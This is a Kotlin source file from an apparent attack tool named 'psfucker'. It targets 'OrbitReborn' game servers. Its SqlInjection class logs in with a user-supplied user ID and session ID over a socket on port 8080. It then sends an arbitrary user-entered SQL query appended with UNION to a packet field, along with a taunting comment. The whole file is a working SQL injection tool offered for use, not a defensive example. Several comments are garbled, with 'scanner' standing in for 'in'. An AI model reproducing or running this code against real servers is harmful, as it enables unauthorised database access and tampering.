package com.manulaiko.psfucker.fuckers.orbitreborn

import com.manulaiko.psfucker.Option
import com.manulaiko.psfucker.net.orbitreborn.ConnectionManager
import com.manulaiko.psfucker.utils.Tools
import com.manulaiko.psfucker.utils.Callback

import java.io.IOException
import java.net.InetSocketAddress
import java.net.Socket


/**
 * SQL injection option
 *
 * Option to execute SQL code scanner the server
 *
 * @author Manulaiko
 * @package com.manulaiko.fuckers.orbitreborn
 */
class SqlInjection
/**
 * Constructor
 *
 * @param fucker
 */
(fucker: com.manulaiko.psfucker.fuckers.OrbitReborn) : Option(fucker) {
    /**
     * Connection socket
     *
     * @var java.net.Socket
     */
    private var socket: Socket? = null

    /**
     * User's ID
     *
     * @var int
     */
    private var userID: Int = 0

    /**
     * User's session id
     *
     * @var String
     */
    private var sessionID: String? = null

    /**
     * Flag to check if we've already tried to connect to server
     *
     * If this flags becomes true and we retry to connect and fail
     * the fucker will stop and come back to main menu
     *
     * @var boolean
     */
    private var alreadyTried = false

    /**
     * ConnectionManager
     *
     * Used to interact with server
     *
     * @var com.manulaiko.net.SocketClient
     */
    private var connection: ConnectionManager? = null

    init {

        this.description = "Executes SQL code scanner the server"
    }

    /**
     * Executes the fucker
     */
    override fun fuck() {
        print("Enter your userID: ")
        this.userID = Tools.scanner.nextInt()
        print("Enter your sessionID: ")
        this.sessionID = Tools.scanner.nextLine()

        if (!connect()) {
            return
        }

        val incommingPackets = Thread(this.connection) as ConnectionManager
        incommingPackets.start()

        incommingPackets.addCallback("on_login", object : Callback() {
            fun call(`object`: Any): Any? {
                val connection = `object` as ConnectionManager
                println("You're now logged scanner!")
                print("Enter your SQL query: ")
                val query = Tools.scanner.nextLine()

                connection.send("7|play_music=1 UNION $query -- It seems you've been fucked :D ")

                println("Query executed!")
                return null
            }
        })
        this.connection!!.login(userID, sessionID)
    }

    /**
     * Connects to the server
     */
    fun connect(): Boolean {
        try {
            this.socket = Socket()
            this.socket!!.connect(InetSocketAddress(this.fucker.server, 8080))
            println("Connected to the server!")
            this.connection = ConnectionManager(socket)
            return true
        } catch (e1: IOException) {
            if (alreadyTried) {
                print("Couldn't connect to the server: ")
                println(e1.message)
                println("Exiting...")
                return false
            } else {
                alreadyTried = true
            }
            println("Couldn't connect to the server!")
            print("Re-enter server IP: ")
            val ip = Tools.scanner.nextLine()
            this.fucker.server = ip
            connect()
        }

        return false
    }
}
